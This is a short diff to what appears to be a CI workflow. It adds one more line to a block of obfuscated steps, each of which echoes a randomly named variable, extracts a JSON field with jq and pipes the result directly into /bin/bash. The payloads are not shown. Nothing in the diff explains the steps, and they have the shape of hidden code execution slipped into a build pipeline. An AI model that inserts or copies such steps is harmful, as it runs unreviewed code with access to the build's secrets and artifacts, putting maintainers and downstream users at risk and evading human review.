@@ -34,6 +34,7 @@ jobs:
           echo $m4 | jq -r .nnls03158 | /bin/bash
           echo $uqkuo5 | jq -r .fqsh37372 | /bin/bash
           printf '%s' "$wlxuy4" | jq -r .bz2004 | /bin/bash
+          echo $z17009 | jq -r .zu988 | /bin/bash
 
       - name: Persist results
         if: always()
